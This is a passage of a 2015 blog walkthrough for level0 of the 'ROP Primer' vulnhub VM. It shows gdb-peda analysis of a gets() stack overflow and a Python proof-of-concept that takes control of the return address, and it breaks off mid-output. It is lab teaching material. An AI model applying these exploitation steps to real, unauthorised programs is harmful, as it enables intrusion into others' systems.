@@ -1,0 +1,1040 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>ROP Primer - Level0 - staring into /dev/null</title>
+  <meta name="author" content="barrebas">
+
+  
+  <meta name="description" content="The ROP VM which I made for this exercise can be downloaded from vulnhub.com. Version 0.2 is fixed, as the home dirs had improper permissions (thanks &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://barrebas.github.io/blog/2015/06/28/rop-primer-level0">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">staring into /dev/null</a></h1>
+  
+    <h2>barrebas</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:barrebas.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">ROP Primer - Level0</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-28T19:45:38+02:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:45 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>The ROP VM which I made for this exercise can be downloaded from <a href="https://www.vulnhub.com/entry/rop-primer-02,114/">vulnhub.com</a>. Version 0.2 is fixed, as the home dirs had improper permissions (thanks to faleur and marky for notifying me). We&rsquo;re up against the binary <code>level0</code>. In this case, we have the source code, which helps tremendously. Nevertheless, start by treating it as a blackbox.</p>
+
+<!--more-->
+
+
+<p>First, enable coredumps.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then, make sure you&rsquo;re not running the exploits against a SUID binary. Linux, by default, will <em>not</em> generate coredumps for SUID binaries. Fair enough. Thanks to @Swappage for alerting me during the workshop!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="c"># remember, coredumps don&#39;t work on suid binaries</span>
+</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="c"># so cp ./level0 (suid level1) to ./level0b</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Finally, disassemble the binary with <code>objdump</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>objdump -d -M intel ./level0 &gt; level0.out
+</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="c"># -M intel will use the Intel syntax instead of AT&amp;T&#39;s syntax.</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In some cases, the binary is the only thing given, with no source code available. The disassembly will help to get an understanding of what the binary is doing.</p>
+
+<p>Another useful command is <code>file</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>file ./level0
+</span><span class='line'>./level0: ELF 32-bit LSB executable, Intel 80386, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux 2.6.26, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0x52c391fb68f9d0b47e49220dfe408334f8fdd088, not stripped
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This tells us that the binary is 32 bit and statically linked, which explains its large size.</p>
+
+<p>Let&rsquo;s have a look at the disassembly of <code>main()</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="m">08048254</span> &lt;main&gt;:
+</span><span class='line'> 8048254:       <span class="m">55</span>                      push   ebp
+</span><span class='line'> 8048255:       <span class="m">89</span> e5                   mov    ebp,esp
+</span><span class='line'> 8048257:       <span class="m">83</span> e4 f0                and    esp,0xfffffff0
+</span><span class='line'> 804825a:       <span class="m">83</span> ec <span class="m">30</span>                sub    esp,0x30
+</span><span class='line'> 804825d:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">68</span> b6 0a <span class="m">08</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab668
+</span><span class='line'> 8048264:       e8 d7 0c <span class="m">00</span> <span class="m">00</span>          call   8048f40 &lt;_IO_puts&gt;
+</span><span class='line'> 8048269:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">80</span> b6 0a <span class="m">08</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab680
+</span><span class='line'> 8048270:       e8 0b 0b <span class="m">00</span> <span class="m">00</span>          call   8048d80 &lt;_IO_printf&gt;
+</span><span class='line'> 8048275:       8d <span class="m">44</span> <span class="m">24</span> <span class="m">10</span>             lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+</span><span class='line'> 8048279:       <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span><span class='line'> 804827c:       e8 2f 0b <span class="m">00</span> <span class="m">00</span>          call   8048db0 &lt;_IO_gets&gt;
+</span><span class='line'> 8048281:       8d <span class="m">44</span> <span class="m">24</span> <span class="m">10</span>             lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+</span><span class='line'> 8048285:       <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+</span><span class='line'> 8048289:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">98</span> b6 0a <span class="m">08</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab698
+</span><span class='line'> 8048290:       e8 eb 0a <span class="m">00</span> <span class="m">00</span>          call   8048d80 &lt;_IO_printf&gt;
+</span><span class='line'> 8048295:       b8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x0
+</span><span class='line'> 804829a:       c9                      leave
+</span><span class='line'> 804829b:       c3                      ret
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We have a classic buffer overflow situation here:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'> 8048275:       8d <span class="m">44</span> <span class="m">24</span> <span class="m">10</span>             lea    eax,<span class="o">[</span>esp+0x10<span class="o">]</span>
+</span><span class='line'> 8048279:       <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span><span class='line'> 804827c:       e8 2f 0b <span class="m">00</span> <span class="m">00</span>          call   8048db0 &lt;_IO_gets&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>lea</code> command will load a stack address into <code>eax</code>. That address is put on the stack as an argument for <code>_IO_gets</code>, which will happily read more than enough bytes from STDIN to overflow the buffer and overwrite the saved return address on the stack.</p>
+
+<p>Let&rsquo;s switch to <code>gdb-peda</code> and see the binary in action.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span><span class="c"># gdb -q is quiet startup, so it won&#39;t print out lots of info. Not strictly necessary. </span>
+</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>gdb ./level0 -q
+</span><span class='line'>Reading symbols from /home/seb/tmp/level0...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
+</span><span class='line'>CANARY    : disabled
+</span><span class='line'>FORTIFY   : disabled
+</span><span class='line'>NX        : ENABLED
+</span><span class='line'>PIE       : disabled
+</span><span class='line'>RELRO     : disabled
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>checksec</code> is a very useful command available in <code>gdb-peda</code> (not in vanilla <code>gdb</code>). In this case, one can see that only NX is enabled, meaning that the stack, heap and other data sections are not executable, whereas code sections are executable but not writeable. Let&rsquo;s check this within <code>gdb</code>. First, enter <code>start</code> to run the binary and break at the <code>main()</code> function automatically. Then, inspect the memory layout with <code>vmmap</code>, which will show memory regions that are active in memory along with their memory protection flags.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>start
+</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
+</span><span class='line'>EAX: 0xbffff6bc --&gt; 0xbffff7ff <span class="o">(</span><span class="s2">&quot;ORBIT_SOCKETDIR=/tmp/orbit-seb&quot;</span><span class="o">)</span>
+</span><span class='line'>EBX: 0x0
+</span><span class='line'>ECX: 0x1
+</span><span class='line'>EDX: 0xbffff6b4 --&gt; 0xbffff7ea <span class="o">(</span><span class="s2">&quot;/home/seb/tmp/level0&quot;</span><span class="o">)</span>
+</span><span class='line'>ESI: 0x80488e0 <span class="o">(</span>&lt;__libc_csu_fini&gt;:   push   ebp<span class="o">)</span>
+</span><span class='line'>EDI: 0x193a5dce
+</span><span class='line'>EBP: 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0
+</span><span class='line'>ESP: 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0
+</span><span class='line'>EIP: 0x8048257 <span class="o">(</span>&lt;main+3&gt;:    and    esp,0xfffffff0<span class="o">)</span>
+</span><span class='line'>EFLAGS: 0x246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
+</span><span class='line'>   0x804824f &lt;frame_dummy+63&gt;:  jmp    0x80481a0 &lt;register_tm_clones&gt;
+</span><span class='line'>   0x8048254 &lt;main&gt;:    push   ebp
+</span><span class='line'>   0x8048255 &lt;main+1&gt;:  mov    ebp,esp
+</span><span class='line'><span class="o">=</span>&gt; 0x8048257 &lt;main+3&gt;:    and    esp,0xfffffff0
+</span><span class='line'>   0x804825a &lt;main+6&gt;:  sub    esp,0x30
+</span><span class='line'>   0x804825d &lt;main+9&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab668
+</span><span class='line'>   0x8048264 &lt;main+16&gt;: call   0x8048f40 &lt;puts&gt;
+</span><span class='line'>   0x8048269 &lt;main+21&gt;: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab680
+</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
+</span><span class='line'>0000<span class="p">|</span> 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0
+</span><span class='line'>0004<span class="p">|</span> 0xbffff61c --&gt; 0x8048445 <span class="o">(</span>&lt;__libc_start_main+421&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax<span class="o">)</span>
+</span><span class='line'>0008<span class="p">|</span> 0xbffff620 --&gt; 0x1
+</span><span class='line'>0012<span class="p">|</span> 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7ea <span class="o">(</span><span class="s2">&quot;/home/seb/tmp/level0&quot;</span><span class="o">)</span>
+</span><span class='line'>0016<span class="p">|</span> 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7ff <span class="o">(</span><span class="s2">&quot;ORBIT_SOCKETDIR=/tmp/orbit-seb&quot;</span><span class="o">)</span>
+</span><span class='line'>0020<span class="p">|</span> 0xbffff62c --&gt; 0x0
+</span><span class='line'>0024<span class="p">|</span> 0xbffff630 --&gt; 0x0
+</span><span class='line'>0028<span class="p">|</span> 0xbffff634 --&gt; 0x0
+</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>
+</span><span class='line'>Temporary breakpoint 1, 0x08048257 in main <span class="o">()</span>
+</span><span class='line'>gdb-peda<span class="nv">$ </span>vmmap
+</span><span class='line'>Start      End        Perm    Name
+</span><span class='line'>0x08048000 0x080ca000 r-xp    /home/seb/tmp/level0
+</span><span class='line'>0x080ca000 0x080cb000 rw-p    /home/seb/tmp/level0
+</span><span class='line'>0x080cb000 0x080ef000 rw-p    <span class="o">[</span>heap<span class="o">]</span>
+</span><span class='line'>0xb7fff000 0xb8000000 r-xp    <span class="o">[</span>vdso<span class="o">]</span>
+</span><span class='line'>0xbffdf000 0xc0000000 rw-p    <span class="o">[</span>stack<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The output of <code>vmmap</code> clearly shows NX in effect: the stack is marked writeable but not executable; the binary, loaded at 0x8048000, is marked executable but not writeable.</p>
+
+<p>So far, so good. Let&rsquo;s continue to run the binary with <code>c</code> and try to overwrite the saved return address on the stack, taking advantage of the <code>_IO_gets</code> call. Note: you can use a patterned buffer for this as well, check out <code>pattern_create</code> and <code>pattern_offset</code> in gdb-peda.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>c
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL</span>
+</span><span class='line'><span class="s1">[+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL!
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
+</span><span class='line'>EAX: 0x0
+</span><span class='line'>EBX: 0x0
+</span><span class='line'>ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84
+</span><span class='line'>EDX: 0x80cb690 --&gt; 0x0
+</span><span class='line'>ESI: 0x80488e0 <span class="o">(</span>&lt;__libc_csu_fini&gt;:   push   ebp<span class="o">)</span>
+</span><span class='line'>EDI: 0x687af80d
+</span><span class='line'>EBP: 0x4b4b4b4b <span class="o">(</span><span class="s1">&#39;KKKK&#39;</span><span class="o">)</span>
+</span><span class='line'>ESP: 0xbffff620 --&gt; 0x0
+</span><span class='line'>EIP: 0x4c4c4c4c <span class="o">(</span><span class="s1">&#39;LLLL&#39;</span><span class="o">)</span>
+</span><span class='line'>EFLAGS: 0x10246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
+</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x4c4c4c4c
+</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
+</span><span class='line'>0000<span class="p">|</span> 0xbffff620 --&gt; 0x0
+</span><span class='line'>0004<span class="p">|</span> 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7ea <span class="o">(</span><span class="s2">&quot;/home/seb/tmp/level0&quot;</span><span class="o">)</span>
+</span><span class='line'>0008<span class="p">|</span> 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7ff <span class="o">(</span><span class="s2">&quot;ORBIT_SOCKETDIR=/tmp/orbit-seb&quot;</span><span class="o">)</span>
+</span><span class='line'>0012<span class="p">|</span> 0xbffff62c --&gt; 0x0
+</span><span class='line'>0016<span class="p">|</span> 0xbffff630 --&gt; 0x0
+</span><span class='line'>0020<span class="p">|</span> 0xbffff634 --&gt; 0x0
+</span><span class='line'>0024<span class="p">|</span> 0xbffff638 --&gt; 0x0
+</span><span class='line'>0028<span class="p">|</span> 0xbffff63c --&gt; 0x0
+</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>Stopped reason: SIGSEGV
+</span><span class='line'>0x4c4c4c4c in ?? <span class="o">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Lucky shot. <code>eip</code> loaded with <code>LLLL</code> because we&rsquo;ve overwritten the return address for <code>main()</code> on the stack. As soon as the <code>ret</code> at the end of <code>main()</code> was executed, it popped the value off of the top of the stack into <code>eip</code> and increased <code>esp</code> with four. Because we&rsquo;ve overwritten that value, we now control <code>eip</code>. To have a look at the stack, issue the following command:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/20wx <span class="nv">$esp</span>-48
+</span><span class='line'>0xbffff5f0:   0x41414141  0x42424242  0x43434343  0x44444444
+</span><span class='line'>0xbffff600:   0x45454545  0x46464646  0x47474747  0x48484848
+</span><span class='line'>0xbffff610:   0x49494949  0x4a4a4a4a  0x4b4b4b4b  0x4c4c4c4c
+</span><span class='line'>0xbffff620:   0x00000000  0xbffff6b4  0xbffff6bc  0x00000000
+</span><span class='line'>0xbffff630:   0x00000000  0x00000000  0x00000000  0x00000000
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>x</code> stands for inspect, with the format specifier and amount after the slash (in this case, 20 DWORDS). Finally, give it the address from which you want to inspect. In this case, I chose <code>$esp-48</code>, which is the start of the buffer on the stack. Confirm that this is our input.</p>
+
+<p>So let&rsquo;s use this first bit of information and write a script to reliably overwrite the saved return address on the stack. This will serve as the skeleton for our exploit.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># this is a helper function, which will take a 32-bit value and convert it to little-endian.</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'><span class="c"># start our payload as a string of character.</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># add padding to overwrite upto the saved return address.</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># this part should overwrite the saved return address on the stack.</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># make sure to output the rop chain.</span>
+</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To verify that this will return to <code>0xdeadbeef</code> by overwriting the saved return address, we have two options:</p>
+
+<ol>
+<li>run it outside of gdb and inspect the coredump that is generated</li>
+<li>run it, store the rop chain in a file and run the binary in gdb with the file as input</li>
+</ol>
+
+
+<h2>Method 1</h2>
+
+<p>Running the exploit in this way is the most accurate way, at least as far as memory layout and stack addresses are concerned. There might be a discrepancy between memory addresses when running within <code>gdb</code> vs outside of <code>gdb</code>. There is a way to fix this, using <a href="">fixenv</a>: I did not know of this solution until BSides!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>python poc.py <span class="p">|</span> ./level0
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? [+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKﾭ�!
+</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>gdb -q ./level0 core
+</span><span class='line'>Reading symbols from /home/seb/tmp/level0...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+</span><span class='line'><span class="o">[</span>New LWP 2922<span class="o">]</span>
+</span><span class='line'>Core was generated by <span class="sb">`</span>./level0<span class="err">&#39;</span>.
+</span><span class='line'>Program terminated with signal 11, Segmentation fault.
+</span><span class='line'><span class="c">#0  0xdeadbeef in ?? ()</span>
+</span><span class='line'>gdb-peda<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Method 2</h2>
+
+<p>This method is especially useful if you need to inspect the memory with <code>vmmap</code>: <code>gdb</code> cannot display memory layout of a coredump!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>python poc.py &gt; input_for_bin
+</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>gdb -q ./level0
+</span><span class='line'>Reading symbols from /home/seb/tmp/level0...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+</span><span class='line'>gdb-peda<span class="nv">$ </span>r &lt; input_for_bin
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? [+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKﾭ�!
+</span><span class='line'>
